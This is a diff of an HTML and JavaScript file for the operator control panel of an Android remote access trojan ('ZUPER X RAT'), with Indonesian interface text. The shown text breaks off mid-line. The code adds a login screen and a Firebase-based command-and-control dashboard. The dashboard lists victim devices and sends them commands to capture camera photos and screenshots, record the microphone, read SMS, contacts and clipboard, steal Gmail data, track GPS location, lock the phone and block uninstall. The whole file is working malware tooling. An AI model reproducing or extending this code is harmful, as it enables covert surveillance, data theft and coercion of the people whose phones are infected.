@@ -3,151 +3,444 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>ZUPER X RAT · KIRIM PERINTAH</title>
+    <title>ZUPER X RAT · LOGIN</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
         body {
-            background: #0a0f1e;
-            color: white;
-            font-family: monospace;
-            padding: 20px;
+            background: radial-gradient(circle at 20% 30%, #0a0f1e, #010101);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
+            padding: 20px;
         }
-        .card {
-            background: #111;
+        /* Login Card */
+        .login-card {
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(16px);
+            border-radius: 56px;
+            padding: 40px 28px;
+            width: 100%;
+            max-width: 360px;
             border: 2px solid #ff3300;
-            border-radius: 30px;
-            padding: 25px;
-            max-width: 450px;
-            width: 100%;
-            box-shadow: 0 0 20px rgba(255,51,0,0.3);
-        }
-        h2 {
             text-align: center;
-            color: #ff7733;
-            margin-bottom: 15px;
+            box-shadow: 0 0 30px rgba(255,51,0,0.3);
         }
-        .info {
-            background: #1a1a1a;
-            padding: 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            word-break: break-all;
-            margin: 15px 0;
-            text-align: center;
+        .logo {
+            font-size: 42px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ff2a2a, #ffaa00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
         }
-        select, button {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border-radius: 50px;
-            border: none;
-            font-size: 16px;
-            background: #222;
-            color: white;
-            text-align: center;
-        }
-        button {
-            background: linear-gradient(95deg, #cc3300, #ff6622);
-            color: black;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        button:active { transform: scale(0.97); }
-        .log {
-            background: black;
-            height: 150px;
-            overflow-y: auto;
-            font-size: 11px;
-            color: #0f0;
-            padding: 8px;
-            border-radius: 16px;
-            margin-top: 15px;
-        }
-        .status {
-            font-size: 12px;
-            text-align: center;
-            margin: 10px 0;
-            color: #ffaa66;
+        .sub {
+            font-size: 14px;
+            color: #ff8844;
+            margin: 12px 0 20px;
         }
         input {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #1a1a1a;
+            padding: 14px;
+            margin: 10px 0;
+            background: #111;
             border: 1px solid #ff4422;
-            border-radius: 30px;
+            border-radius: 60px;
             color: white;
             text-align: center;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 16px;
+            background: linear-gradient(95deg, #cc3300, #ff6622);
+            border: none;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 18px;
+            color: black;
+            cursor: pointer;
+        }
+        button:active { transform: scale(0.97); }
+        .error-msg {
+            margin-top: 20px;
+            color: #ff6666;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        /* Dashboard (awalnya tersembunyi) */
+        .dashboard {
+            display: none;
+            width: 100%;
+            max-width: 1400px;
+            margin: auto;
+        }
+        .container {
+            width: 100%;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            background: linear-gradient(135deg, #ff2a2a, #ffaa00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-size: 2.2rem;
+        }
+        .card {
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid #ff4422;
+            border-radius: 28px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        .card-title {
+            font-size: 1.3rem;
+            border-left: 5px solid #ff5722;
+            padding-left: 12px;
+            margin-bottom: 15px;
+            color: #ffaa66;
+        }
+        .flex-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        select, input[type="text"] {
+            background: #1a1a2a;
+            border: 1px solid #ff5722;
+            padding: 10px 15px;
+            border-radius: 40px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+        .btn-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .btn-cmd {
+            background: #ff5722;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px;
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .btn-cmd:active { transform: scale(0.96); }
+        .btn-success { background: #2e7d32; }
+        .btn-danger { background: #aa2222; }
+        .device-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 12px;
+            margin-top: 10px;
+        }
+        .device-card {
+            background: #11161f;
+            border: 1px solid #ff8844;
+            border-radius: 20px;
+            padding: 12px;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .device-card:hover { background: #1f2a2f; }
+        .device-card.selected { border: 2px solid #ffaa00; background: #2a1f1a; }
+        .device-name { font-weight: bold; color: #ffaa66; }
+        .device-id { font-size: 10px; color: #aaa; word-break: break-all; }
+        .log-area {
+            background: #000000aa;
+            border-radius: 20px;
+            height: 200px;
+            overflow-y: auto;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #0f0;
+            border: 1px solid #ff6633;
+            margin-top: 15px;
+        }
+        .status { font-size: 12px; color: #ffaa77; margin-top: 8px; }
+        hr { border-color: #ff4422; margin: 10px 0; }
+        @media (max-width: 600px) {
+            .btn-group { grid-template-columns: repeat(2, 1fr); }
         }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2>💀 ZUPER X RAT · CONTROL</h2>
-    <div class="status">🔗 Terhubung ke Firebase</div>
-    <div class="info">
-        <strong>Target Device ID</strong><br>
-        <input type="text" id="deviceIdInput" placeholder="Masukkan ID korban" value="17287436-11cc-481a-9f44-75fe45681e2e">
+    <!-- LOGIN FORM -->
+    <div id="loginCard" class="login-card">
+        <div class="logo">ZUPER X RAT</div>
+        <div class="sub">Silahkan Login</div>
+        <input type="text" id="loginUsername" placeholder="Username" autocomplete="off">
+        <input type="password" id="loginPassword" placeholder="Password">
+        <button id="loginBtn">LOGIN</button>
+        <div id="loginError" class="error-msg"></div>
     </div>
-    <select id="cmdSelect">
-        <option value="camera">📸 Ambil Foto (download otomatis)</option>
-        <option value="flash_on">💡 Senter ON</option>
-        <option value="flash_off">💡 Senter OFF</option>
-        <option value="location">📍 Lacak Lokasi</option>
-        <option value="lock">🔒 Lock HP</option>
-        <option value="sms">📨 Baca SMS</option>
-        <option value="contacts">📞 Baca Kontak</option>
-        <option value="popup">⚠️ Kirim Popup</option>
-    </select>
-    <button id="sendBtn">📡 KIRIM PERINTAH</button>
-    <div class="log" id="logBox">>> Siap. Masukkan ID korban lalu kirim perintah.</div>
-</div>
 
-<script>
-    // GANTI DENGAN URL FIREBASE ANDA
-    const firebaseConfig = {
-        databaseURL: "https://YOUR_FIREBASE_URL.firebaseio.com/"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    <!-- DASHBOARD (setelah login) -->
+    <div id="dashboard" class="dashboard">
+        <div class="container">
+            <div class="header">
+                <h1><i class="fas fa-skull"></i> ZUPER X RAT <i class="fas fa-bolt"></i></h1>
+                <div class="sub">Full Control Panel · Kirim perintah ke semua korban dengan ID Attacker</div>
+            </div>
 
-    const sendBtn = document.getElementById('sendBtn');
-    const deviceIdInput = document.getElementById('deviceIdInput');
-    const cmdSelect = document.getElementById('cmdSelect');
-    const logBox = document.getElementById('logBox');
+            <!-- SETUP ID ATTACKER -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-fingerprint"></i> Identitas Attacker</div>
+                <div class="flex-row">
+                    <label>ID Attacker (kunci koneksi):</label>
+                    <input type="text" id="attackerId" value="ZUPERX_MASTER_001" style="flex:2;">
+                    <button id="setAttackerBtn">Set ID & Refresh</button>
+                </div>
+                <div class="status" id="connStatus">🔗 Belum terhubung ke Firebase. Klik Set ID.</div>
+            </div>
 
-    function log(msg) {
-        const time = new Date().toLocaleTimeString();
-        logBox.innerHTML += `<div>[${time}] ${msg}</div>`;
-        logBox.scrollTop = logBox.scrollHeight;
-        if (logBox.children.length > 100) logBox.removeChild(logBox.firstChild);
-    }
+            <!-- DAFTAR DEVICE ONLINE -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-mobile-alt"></i> Device Korban Online</div>
+                <div id="deviceListContainer" class="device-grid">Belum ada device. Pastikan APK korban online dengan ID Attacker yang sama.</div>
+                <div class="status" id="selectedDeviceStatus">⚡ Belum pilih device. Kirim perintah ke semua device atau pilih salah satu.</div>
+            </div>
 
-    sendBtn.onclick = () => {
-        let deviceId = deviceIdInput.value.trim();
-        if (!deviceId) {
-            log("❌ Masukkan Device ID target!");
-            return;
-        }
-        const cmd = cmdSelect.value;
-        const cmdRef = db.ref("commands").child(deviceId);
-        cmdRef.set({
-            action: cmd,
-            timestamp: Date.now()
-        }).then(() => {
-            log(`✅ Perintah "${cmd}" terkirim ke ${deviceId.substring(0,12)}...`);
-        }).catch(err => {
-            log(`❌ Gagal: ${err.message}`);
-        });
-    };
+            <!-- PANEL KONTROL -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-gamepad"></i> Kirim Perintah</div>
+                <div class="flex-row">
+                    <button id="sendToAllBtn" class="btn-cmd btn-success">🌐 Kirim ke SEMUA Device</button>
+                    <button id="sendToSelectedBtn" class="btn-cmd" style="background:#ff9800;">🎯 Kirim ke Device Terpilih</button>
+                </div>
+                <hr>
+                <div class="btn-group">
+                    <button class="btn-cmd" data-cmd="camera_front"><i class="fas fa-camera-retro"></i> Kamera Depan</button>
+                    <button class="btn-cmd" data-cmd="camera_back"><i class="fas fa-camera"></i> Kamera Belakang</button>
+                    <button class="btn-cmd" data-cmd="screenshot"><i class="fas fa-desktop"></i> Screenshot</button>
+                    <button class="btn-cmd btn-danger" data-cmd="lock"><i class="fas fa-lock"></i> LOCK HP</button>
+                    <button class="btn-cmd btn-success" data-cmd="unlock"><i class="fas fa-unlock-alt"></i> UNLOCK HP</button>
+                    <button class="btn-cmd" data-cmd="get_gmail"><i class="fab fa-google"></i> Ambil Gmail</button>
+                    <button class="btn-cmd" data-cmd="sms"><i class="fas fa-envelope"></i> Baca SMS</button>
+                    <button class="btn-cmd" data-cmd="contacts"><i class="fas fa-address-book"></i> Baca Kontak</button>
+                    <button class="btn-cmd" data-cmd="location"><i class="fas fa-map-marker-alt"></i> Lokasi GPS</button>
+                    <button class="btn-cmd" data-cmd="flash_on"><i class="fas fa-lightbulb"></i> Senter ON</button>
+                    <button class="btn-cmd" data-cmd="flash_off"><i class="fas fa-lightbulb"></i> Senter OFF</button>
+                    <button class="btn-cmd" data-cmd="mic_start"><i class="fas fa-microphone"></i> Rekam Suara</button>
+                    <button class="btn-cmd" data-cmd="mic_stop"><i class="fas fa-stop"></i> Stop Rekam</button>
+                    <button class="btn-cmd" data-cmd="toast"><i class="fas fa-comment"></i> Toast</button>
+                    <button class="btn-cmd" data-cmd="popup"><i class="fas fa-exclamation-triangle"></i> Popup</button>
+                    <button class="btn-cmd" data-cmd="clipboard"><i class="fas fa-paste"></i> Clipboard</button>
+                    <button class="btn-cmd" data-cmd="uninstall_block"><i class="fas fa-ban"></i> Blok Uninstall</button>
+                </div>
+                <div class="flex-row">
+                    <input type="text" id="extraData" placeholder="Data tambahan (untuk popup/toast/URL)" style="flex:2;">
+                    <select id="customCmdSelect">
+                        <option value="popup">Popup</option>
+                        <option value="toast">Toast</option>
+                        <option value="open_url">Buka URL</option>
+                    </select>
+                    <button id="sendCustomCmd" class="btn-cmd" style="background:#555;">⚙️ Kirim</button>
+                </div>
+                <div class="log-area" id="logArea"><div>[✓] Panel siap. Set ID Attacker untuk memulai.</div></div>
+            </div>
+        </div>
+    </div>
 
-    log("✅ Panel siap. Pastikan target APK phishing online di Firebase yang sama.");
-</script>
-</body>
-</html>
+    <script>
+        // ========== LOGIN ==========
+        const loginCard = document.getElementById('loginCard');
+        const dashboardDiv = document.getElementById('dashboard');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginUser = document.getElementById('loginUsername');
+        const loginPass = document.getElementById('loginPassword');
+        const loginError = document.getElementById('loginError');
+
+        loginBtn.onclick = () => {
+            const user = loginUser.value.trim();
+            const pass = loginPass.value.trim();
+            if (user === "Gilang" && pass === "Gilang") {
+                // login sukses
+                loginCard.style.display = "none";
+                dashboardDiv.style.display = "block";
+                initFirebaseAndControls();
+            } else {
+                loginError.innerText = "Lah u siapa mbruk?";
+                loginUser.value = "";
+                loginPass.value = "";
+            }
+        };
+        // biar enter juga bisa
+        loginUser.addEventListener('keypress', (e) => { if(e.key === 'Enter') loginBtn.click(); });
+        loginPass.addEventListener('keypress', (e) => { if(e.key === 'Enter') loginBtn.click(); });
+
+        // ========== VARIABEL GLOBAL ==========
+        let db, currentAttackerId = "", selectedDeviceId = null;
+        let deviceList = {};
+        let devicesRef = null;
+        let responsesRef = null;
+
+        function initFirebaseAndControls() {
+            // GANTI URL FIREBASE ANDA DI SINI
+            const firebaseConfig = {
+                databaseURL: "https://YOUR_FIREBASE_URL.firebaseio.com/"
+            };
+            firebase.initializeApp(firebaseConfig);
+            db = firebase.database();
+
+            const attackerIdInput = document.getElementById('attackerId');
+            const setAttackerBtn = document.getElementById('setAttackerBtn');
+            const connStatusSpan = document.getElementById('connStatus');
+            const deviceListContainer = document.getElementById('deviceListContainer');
+            const selectedDeviceStatus = document.getElementById('selectedDeviceStatus');
+            const logArea = document.getElementById('logArea');
+
+            function addLog(msg, type = "info") {
+                const time = new Date().toLocaleTimeString();
+                const prefix = type === "error" ? "❌" : (type === "success" ? "✅" : "📡");
+                const div = document.createElement('div');
+                div.innerHTML = `[${time}] ${prefix} ${msg}`;
+                logArea.appendChild(div);
+                logArea.scrollTop = logArea.scrollHeight;
+                if (logArea.children.length > 150) logArea.removeChild(logArea.firstChild);
+            }
+
+            function renderDeviceList() {
+                let html = "";
+                if (Object.keys(deviceList).length === 0) {
+                    html = "<div style='color:#aaa; text-align:center;'>Belum ada device terhubung dengan ID Attacker ini.</div>";
+                } else {
+                    for (let id in deviceList) {
+                        const info = deviceList[id].info || {};
+                        const status = deviceList[id].status || "online";
+                        const isSelected = (selectedDeviceId === id) ? "selected" : "";
+                        html += `
+                            <div class="device-card ${isSelected}" data-id="${id}">
+                                <div class="device-name"><i class="fas fa-mobile"></i> ${info.name || "Device"}</div>
+                                <div class="device-id">ID: ${id.substring(0,12)}...</div>
+                                <div style="font-size:10px; color:${status === 'online' ? '#0f0' : '#f00'}">${status}</div>
+                                <button class="select-device-btn" data-id="${id}" style="margin-top:5px; background:#ff8844; font-size:10px;">Pilih</button>
+                            </div>
+                        `;
+                    }
+                }
+                deviceListContainer.innerHTML = html;
+                document.querySelectorAll('.select-device-btn').forEach(btn => {
+                    btn.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        const id = btn.getAttribute('data-id');
+                        selectedDeviceId = id;
+                        selectedDeviceStatus.innerHTML = `🎯 Target device dipilih: ${id.substring(0,12)}...`;
+                        renderDeviceList();
+                    });
+                });
+                document.querySelectorAll('.device-card').forEach(card => {
+                    card.addEventListener('click', (e) => {
+                        if (e.target.classList.contains('select-device-btn')) return;
+                        const id = card.getAttribute('data-id');
+                        if (id) {
+                            selectedDeviceId = id;
+                            selectedDeviceStatus.innerHTML = `🎯 Target device dipilih: ${id.substring(0,12)}...`;
+                            renderDeviceList();
+                        }
+                    });
+                });
+            }
+
+            function loadDevices() {
+                if (!currentAttackerId) return;
+                if (devicesRef) devicesRef.off();
+                devicesRef = db.ref(`devices/${currentAttackerId}`);
+                devicesRef.on('value', (snapshot) => {
+                    deviceList = snapshot.val() || {};
+                    renderDeviceList();
+                    addLog(`Memuat ${Object.keys(deviceList).length} device online`);
+                }, (err) => addLog(`Error load devices: ${err.message}`, "error"));
+            }
+
+            function listenResponses() {
+                if (!currentAttackerId) return;
+                if (responsesRef) responsesRef.off();
+                responsesRef = db.ref(`responses/${currentAttackerId}`);
+                responsesRef.on('child_added', (snapshot) => {
+                    const deviceId = snapshot.key;
+                    const data = snapshot.val();
+                    addLog(`📥 Response dari ${deviceId.substring(0,8)}: ${JSON.stringify(data).substring(0, 200)}`);
+                });
+            }
+
+            function sendCommand(action, data = "", targetDeviceId = null) {
+                if (!currentAttackerId) {
+                    addLog("ID Attacker belum di-set!", "error");
+                    return false;
+                }
+                const payload = {
+                    action: action,
+                    data: data,
+                    timestamp: Date.now(),
+                    target_device: targetDeviceId || "all"
+                };
+                db.ref(`commands/${currentAttackerId}`).set(payload).then(() => {
+                    const targetMsg = targetDeviceId ? `ke device ${targetDeviceId.substring(0,8)}` : "ke SEMUA device";
+                    addLog(`Perintah "${action}" dikirim ${targetMsg}`);
+                }).catch(err => addLog(`Gagal kirim: ${err.message}`, "error"));
+                return true;
+            }
+
+            function sendToAll(action, data = "") { sendCommand(action, data, null); }
+            function sendToSelected(action, data = "") {
+                if (!selectedDeviceId) { addLog("Tidak ada device terpilih.", "error"); return; }
+                sendCommand(action, data, selectedDeviceId);
+            }
+
+            function setAttackerId() {
+                let id = attackerIdInput.value.trim();
+                if (!id) { addLog("ID Attacker tidak boleh kosong!", "error"); return; }
+                currentAttackerId = id;
+                localStorage.setItem("attackerId", id);
+                connStatusSpan.innerHTML = `✅ Terhubung dengan ID: ${currentAttackerId}`;
+                addLog(`ID Attacker di-set ke ${currentAttackerId}. Memuat device...`, "success");
+                loadDevices();
+                listenResponses();
+            }
+
+            // load saved ID
+            const savedId = localStorage.getItem("attackerId");
+            if (savedId) {
+                attackerIdInput.value = savedId;
+                setAttackerId();
+            } else {
+                connStatusSpan.innerHTML = "⚙️ Masukkan ID Attacker dan klik 'Set ID' untuk mulai.";
+            }
+
+            setAttackerBtn.onclick = setAttackerId;
+
+            // tombol perintah
+            document.querySelectorAll('.btn-cmd[data-cmd]').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const cmd = btn.getAttribute('data-cmd');
+                    const extra = document.getElementById('extraData').value;
+                    if (selectedDeviceId) sendCommand(cmd, extra, selectedDeviceId);
+                    else sendCommand(cmd, extra, null);
+                });
+            });
+            document.get
